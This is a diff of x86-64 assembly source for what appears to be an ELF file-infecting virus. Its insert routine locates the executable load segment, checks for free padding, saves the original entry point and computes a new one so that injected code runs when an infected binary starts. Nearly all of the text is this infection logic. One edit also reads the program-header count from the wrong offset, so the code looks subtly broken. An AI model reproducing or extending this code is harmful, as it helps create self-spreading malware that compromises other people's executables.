@@ -106,7 +106,7 @@ scandir:        mov         rdx, BUF_SIZE
                 syscall
 _return:
                 pop         rax
-                
+
                 pop         rdx
                 pop         rcx
                 pop         rsi
@@ -183,33 +183,34 @@ is_valid_elf64:                                                 ; expecing data 
 .return:        ret
 
 insert:                                                         ; expecting data in rdi
-                push        rbx
+                push        r12
                 push        r13
                 push        r14
                 push        r15
 
                 mov         r15, rdi
-                mov         rbx, qword [rdi + 0x18]             ; entry point
-                mov         [rel entry], rbx
+
+                mov         rdx, qword [r15 + 0x18]             ; entry point
                 mov         rax, qword [rdi + 0x20]             ; e_phoff
-                movzx       rcx, word [rdi + 0x38]              ; e_phnum
                 add         rdi, rax                            ; rdi = *Elf64_Phdr
+                movzx       rcx, word [rdi + 0x38]              ; e_phnum
 .segment:       cmp         rcx, 0
                 jle         .return
                 mov         rax, 0x0000000500000001             ; p_flags = PF_X | PF_R, p_type = PT_LOAD
                 cmp         rax, qword [rdi]
                 jnz         .next
                 mov         rax, qword [rdi + 8]                ; p_offset
-                mov         rdx, qword [rdi + 0x10]             ; p_vaddr
-                add         rax, rdx
-                cmp         rbx, rax
+                add         rax, qword [rdi + 0x10]             ; p_vaddr
+                cmp         rdx, rax
                 jb          .next
                 add         rax, qword [rdi + 0x20]             ; p_vaddr + p_offset + p_filesz
                 mov         r13, rax                            ; new entry point
-                cmp         rbx, rax
+                cmp         rdx, rax
                 jae         .next
-                sub         rax, rdx
+                sub         rax, qword [rdi + 0x10]             ; rax = p_offset + p_filesz
+
                 mov         r14, rdi                            ; code segment Elf64_Phdr*
+
                 mov         rdi, r15                            ; beginning of file
                 add         rdi, rax
                 mov         rsi, rdi                            ; save: end of segment
@@ -219,8 +220,12 @@ insert:                                                         ; expecting data
                 test        rcx, rcx
                 ja          .return                             ; not enough room
 
+                mov         rax, qword [r15 + 0x18]             ; entry point
+                mov         [rel entry], rax
+
                 xor         rax, rax
                 mov         [rel pie_address], rax
+
                 mov         ax, word [r15 + 0x10]               ; e_type
                 cmp         ax, 2                               ; ET_EXEC
                 jz          .no_pie
@@ -247,11 +252,11 @@ insert:                                                         ; expecting data
                 dec         rcx
                 jmp         .segment
 
-.return:        
+.return:
                 pop         r15
                 pop         r14
                 pop         r13
-                pop         rbx
+                pop         r12
                 ret
 
 
